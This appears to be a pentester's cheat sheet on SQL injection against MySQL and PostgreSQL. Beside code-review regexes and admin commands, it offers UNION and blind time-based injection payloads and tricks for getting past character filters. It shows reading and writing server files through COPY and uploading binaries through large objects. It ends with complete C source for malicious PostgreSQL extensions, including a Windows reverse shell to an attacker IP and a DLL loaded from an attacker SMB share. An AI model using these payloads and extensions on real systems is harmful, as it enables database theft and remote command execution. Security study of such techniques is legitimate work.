# SQL Injection tips


## Code Review Regex
```sql
^.*?query.*?select.*?

egrep "^.*?query.*?select.*?" $i
for i in $(cat doGet.txt); do echo $i && egrep "^.*?query.*?select.*?" $i; done

egrep "^.*?\"select.*?" $i
for i in $(cat doGet.txt); do echo $i && egrep "^.*?\"select.*?" $i; done

egrep  "^.*?request\.getParameter\(\"" $i
for i in $(cat doGet.txt); do if egrep -q "^.*?\"select.*?" $i; then if egrep -q "^.*?request\.getParameter\(\"" $i; then echo $i;fi  ;fi; done

# Improved regex
^.*?['"]SELECT.*?['"]\ ?[\+\.]
^.*?['"]UPDATE.*?SET.*?['"]\ ?[\+\.]
^.*?['"]INSERT INTO.*?['"]\ ?[\+\.]

# Targeted/Group Matching
perl -lne 'print $1 if /<REGEX>/' < * 
```

## MySQL
* Turn on debug
    * Edit mysql config file
        ```
        sudo nano /etc/mysql/my.cnf
        ```
    * Uncomment or modify these settings into these values
        ```sql
        general_log_file = /var/log/mysql/mysql.log
        general_log = 1
        ```
    * Restart services
        ```
        sudo systemctl restart mysql
        ```
    * Tail the logs
        ```
        sudo tail –f /var/log/mysql/mysql.log
        ```
### Alternatives / Bypass
```sql
space is /**/
Comment is #
```
### Basic MySQL Queries
* Check current DB Version
```sql
select version();
@@version;
```
* Show current User
```sql
select user();
# or
select current_user();
```
* Boolean Example
```sql
SELECT count(*) FROM <table> where <column_name> LIKE <QUERY>
```
* Show if current user is a database admin (DBA)
```sql
SELECT false OR (select count(user) from mysql.user where (INSTR((select user()), user)  and  super_priv = 'Y' and host = 'localhost')) = 1; # Boolean
SELECT user from mysql.user where (user = substring_index((select user()),'@',1) and super_priv = 'Y' and host = 'localhost'); # Better
SELECT false OR (select count(user) from mysql.user where (user = substring_index((select user()),'@',1) and super_priv = 'Y' and host = 'localhost'))=1; # Boolean
```
* Add Values
```sql
INSERT INTO users(user_id,login,password,email) VALUES( "4" , "user4"   , "password4" , "user4@test.local");
```
* Update Values
```sql
UPDATE users SET Status = 1 where login='user4';
```

### Payloads
* Union
    ```
    " UNION ALL SELECT 1,2,3,4,5#   #<-- Depending on number of rows, start from 1 and increase
    " test_value" UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#   
    ```
### Limitations
* Python
    * PyMysql only allows 1 query execution unless parameter `multi=True` is set

### Collations
* Determine Collation
    * From MySQL cli
        ```sql
        SELECT COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = "powertableTop" AND COLUMN_NAME = "name";
        ```
    * Once collation is known, append to 'column name' after `SELECT`
        ```sql
        SELECT name COLLATE utf8mb4_general_ci FROM someTable; #ci means case-insensitive
        SELECT name COLLATE utf8mb4_general_ci, reset_password_key COLLATE utf8mb4_general_ci FROM someTable;
        "test_value" UNION ALL SELECT name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM someTable;
        ```

* Associated Use cases:
    * Bypass authentication using Password reset by finding authentication token



---
## PostgreSQL
### Enable Debugging
* Edit `postgresql.conf` and change `log_statement` to `all`
    ```
    log_statement = 'all' # none, ddl, mod, all
    ```

### Helpful URLs:
    * OnSecurity[^1]
    * Pulse Security[^2]

### Basic commands
* Tail a log file in Windows
    ```powershell
    Get-Content “C:\temp\pgsql_log\*” -Tail 10 -Wait | Select-String -Pattern "SOMEWEIRDTABLE" -Context 0,3
    ```
* Connect to DB
    * Windows
        ```
        psql -U postgres -p 15432 -d <db_name>
        ```
    * Linux
        ```
        sudo -i -u postgres
        psql
        ```
* List all Databases
    ```sql
    \l
    ```
* Switch database
    ```sql
    \c <db_name> <username>
    ```
* Create a database
    ```sql
    create database webappDB;
    ```
* List all users and roles
    ```sql
    \du
    ```
* Select version
    ```sql
    SELECT version();
    ```
* Help
    ```sql
    \?
    ```
* Dump postgresql database (backup)
    ```bash
    sudo -i -u postgres
    pg_dump <DB_NAME> > /tmp/dump
    ```
* Restore postgresql database
    ```bash
    psql <DB_NAME> < /tmp/dump
    ```
* Creata a database user[^4][^5]
    ```sql
    create user webappuser;
    create user webappuser with encrypted password 'mypass';
    grant all privileges on database webappDB to webappuser;
    ALTER USER webapp with superuser; # Grant superuser
    ```
* Delete a DB user
    ```sql
    DROP user webappuser;
    ```
* Sleep
    ```sql
    pg_sleep(10);
    ```
* Bypass Character Restriction
    * `CHR` and String Concatenation. Only works in `SELECT`,`INSERT`, `DELETE` queries
        ```sql
        SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);
        ```
    * Quote can be replaced by `$$`
        ```sql
        SELECT 'TESTVALUE';
        SELECT $$TESTVALUE$$;
        SELECT $TAG$TESTVALUE$TAG$;
        ```
* Check if the current user is a superuser (DBA)
    ```sql
    SELECT current_setting('is_superuser');
    ```
* List all tables
    ```sql
    \dt
    ```
* Create table
    ```sql
    CREATE TEMP TABLE SOMETABLE(columnbus123 text);
    ```
* Insert Values
    ```sql
    INSERT INTO SOMETABLE(columnbus123) VALUES ($$test$$);
    ```
* Drop/delete table
    ```sql
    DROP table SOMETABLE;
    ```
* Test Boolean
    ```sql
    1 UNION SELECT CASE WHEN (SELECT 1)=1 THEN 1 ELSE 0 END;
    ```
* Stacked queries
    ```sql
    1;SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END)--
    ;SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+ # Time based example
    ```

### Specific usual/allowed/working subqueries for specific locations within the query
* where
    ```sql
    WHERE usedid=1 UNION SELECT CASE WHEN (SELECT 1)=1 THEN 1 ELSE 0 END
    ```
  * When stacked queries are available but still blind
    ```sql
    WHERE userid=1; SELECT CASE WHEN (SELECT current_setting($$is_superuser$$))=$$on$$ THEN pg_sleep(5) end;--
    ```
* order by
    ```sql
    (SELECT CASE WHEN COUNT((SELECT (SELECT CASE WHEN COUNT((SELECT username FROM staff WHERE username SIMILAR TO 'M%'))<>0 THEN pg_sleep(20) ELSE '' END)))<>0 THEN true ELSE false END); -- - # From link at the start
    (SELECT CASE WHEN COUNT((SELECT (SELECT CASE WHEN LENGTH(([SQLI])::text)=NUMNUMNUM THEN pg_sleep({sqli_sleep_time}) ELSE '' END)))<>0 THEN true ELSE false END) # Actually used for getLength (Replace [SQLI] of couse with variable sqli_sleep_time. Also NUMNUMNUM will be replaced)
    (SELECT CASE WHEN COUNT((SELECT (SELECT CASE WHEN SUBSTRING(([SQLI])::text,POSPOSPOS,1)=CHR(NUMNUMNUM) THEN pg_sleep({sqli_sleep_time}) ELSE '' END)))<>0 THEN true ELSE false END) # Actually used to get data line by line. (Replace [SQLI] of couse with variable sqli_sleep_time. Also NUMNUMNUM and POSPOSPOS will be replaced)
    ORDER BY note, (CASE WHEN (SELECT '1')='1')+THEN+note+ELSE+id::text+END) # Turn to boolean by making the output different by the way it is sorted. From the .nz link at the start
    ```
### Write to file system
```sql
CREATE TEMP TABLE USERS(userdesccolumn text);INSERT INTO USERS(userdesccolumn) VALUES ($$test$$);
COPY USERS(userdesccolumn) TO $$C:\temp\writtenfile.txt$$;
COPY (SELECT 'USERS') to 'C:\Users\Public\writtenfile.txt';
```

### Reading content from file system
```sql
COPY <table_name> from <file_name> # Template
CREATE temp table tempTable (content text);
COPY tempTable from $$c:\secret.txt$$;
;create+temp+table+tempTable+(content+text);copy+tempTable+from+$$c:\secret.txt$$;select+case+when(ascii(substr((select+content+from+tempTable),1,1))=104)+then+pg_sleep(10)+end;--+ # Boolean Time-Based
```

### Executing commands via PostgreSQL Extensions
* Loading extensions
  ```sql
  CREATE OR REPLACE FUNCTION test(text) RETURNS void AS 'FILENAME', 'test' LANGUAGE 'C' STRICT; -- Must define an appropriate Postgres structure (magic block)
  create or replace function test(text, integer) returns void as $$C:\malicious.dll$$,$$test$$ language C strict;
  SELECT test($$calc.exe$$, 1);
  ```
* How to build a custom extension? see far below

### Large Objects (Uploading a Binary)
* This (large objects) only works on the dba (admin) level
* Import
    ```sql
    select lo_import('C:\\Windows\\win.ini');
    select lo_import('C:\\Windows\\win.ini', 1337); -- Import defining loid
    ```
* List
    ```sql
    \lo_list
    ```
* Viewing Content
    ```sql
    select loid, pageno from <table>; -- per page, max 2kB blocks
    select loid, pageno, encode(data, 'escape') from <table>; -- per page, max 2kB blocks
    ```
* Update entry (adding file remotely)
    ```sql
    update <table> set data=decode('77303074', 'hex') where loid=1337 and pageno=0; --decoded data is 'woot'
    UPDATE PG_LARGEOBJECT SET data=decode($${udf_chunk}$$,$$hex$$) where loid={loid} and pageno={i};--
    ```
* Insert new data to new pages (comes after update to pageno=0)
    ```sql
    INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES ({loid},{i},decode($${udf_chunk}$$,$$hex$$));--
    ```
* Export
    ```sql
    select lo_export(1337, 'C:\\new_win.ini');
    ```
* To trigger UDF, see "Executing commands via PostgreSQL Extensions" above[^3]
* Cleanup/Delete/Unlink
    ```sql
    lo_unlink 1337
    ```

* PostgresQL extensions
    *  Extensions to execute commands (For Windows)
        ```c
        #include "postgres.h"
        #include <string.h>
        #include "fmgr.h"
        #include "utils/geo_decls.h"
        #include <stdio.h>
        #include "utils/builtins.h"

        #ifdef PG_MODULE_MAGIC
        PG_MODULE_MAGIC;
        #endif

        /* Add a prototype marked PGDLLEXPORT */
        PGDLLEXPORT Datum malicious(PG_FUNCTION_ARGS);
        PG_FUNCTION_INFO_V1(malicious);

        /* this function launches the executable passed in as the first parameter
        in a FOR loop bound by the second parameter that is also passed*/
        Datum
        malicious(PG_FUNCTION_ARGS)
        {
            /* convert text pointer to C string */
        #define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))

            /* retrieve the second argument that is passed to the function (an integer)
            that will serve as our counter limit*/

            int instances = PG_GETARG_INT32(1);

            for (int c = 0; c < instances; c++) {
                /*launch the process passed in the first parameter*/
                ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);
            }
            PG_RETURN_VOID();
        }

        /* Executing this on PostgreSQL query*/
        /* create or replace function test(text, integer) returns void as $$C:\malicious.dll$$, $$malicious$$ language C strict;
        SELECT test($$calc.exe$$, 1); */
        /* If remotely then on the Kali: sudo impacket-smbserver malicious_share /home/kali/share/
        /* CREATE OR REPLACE FUNCTION remote_test(text, integer) RETURNS void AS $$\\192.168.1.2\malicious_share\malicious.dll$$, $$malicious$$ LANGUAGE C STRICT;
        SELECT remote_test($$calc.exe$$, 1); */
        ```
    * Reverse shell (For Windows)
        ```c
        #define _WINSOCK_DEPRECATED_NO_WARNINGS
        #include "postgres.h"
        #include <string.h>
        #include "fmgr.h"
        #include "utils/geo_decls.h"
        #include <stdio.h>
        #include <winsock2.h>
        #include "utils/builtins.h"
        #pragma comment(lib, "ws2_32")

        #ifdef PG_MODULE_MAGIC
        PG_MODULE_MAGIC;
        #endif

        /* Add a prototype marked PGDLLEXPORT */
        PGDLLEXPORT Datum connect_back(PG_FUNCTION_ARGS);
        PG_FUNCTION_INFO_V1(connect_back);

        WSADATA wsaData;
        SOCKET s1;
        struct sockaddr_in hax;
        char ip_addr[16];
        STARTUPINFO sui;
        PROCESS_INFORMATION pi;

        Datum
        connect_back(PG_FUNCTION_ARGS)
        {

            /* convert C string to text pointer */
        #define GET_TEXT(cstrp) \
           DatumGetTextP(DirectFunctionCall1(textin, CStringGetDatum(cstrp)))

            /* convert text pointer to C string */
        #define GET_STR(textp) \
          DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))

            WSAStartup(MAKEWORD(2, 2), &wsaData);
            s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);



            hax.sin_family = AF_INET;
            hax.sin_port = htons(PG_GETARG_INT32(1));
            hax.sin_addr.s_addr = inet_addr(GET_STR(PG_GETARG_TEXT_P(0)));
            /*read documentation here:
            https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect
            which offered a pointer to here
            https://docs.microsoft.com/en-us/windows/win32/winsock/sockaddr-2
            */

            WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

            memset(&sui, 0, sizeof(sui));
            sui.cb = sizeof(sui);
            sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
            sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)s1;

            CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
            PG_RETURN_VOID();
        }
        /*Executing this code*/
        /*create or replace function rev_shell(text, integer) returns void as $$C:\rev_shell.dll$$, $$connect_back$$ language C strict;*/
        /*SELECT rev_shell($$192.168.1.2$$,9000);*/
        ```
    * For Linux[^6]





[^1]: [OnSecurity](https://www.onsecurity.io/blog/pentesting-postgresql-with-sql-injections/)
[^2]: [Pulse Security](https://pulsesecurity.co.nz/articles/postgres-sqli)
[^3]: [Executing commands via PostgreSQL Extensions](./SQLi.html#Executing-commands-via-PostgreSQL-Extensions)
[^4]: [Medium - Arnav Gupta - Creating user, database and adding access on PostgreSQL](https://medium.com/coding-blocks/creating-user-database-and-adding-access-on-postgresql-8bfcd2f4a91e)
[^5]: [Chartio - Aj Welch - How to Change a User to Superuser in PostgreSQL](https://chartio.com/resources/tutorials/how-to-change-a-user-to-superuser-in-postgresql/)
[^6]: [HackTricks - RCE with PostgreSQL Extensions](https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions)
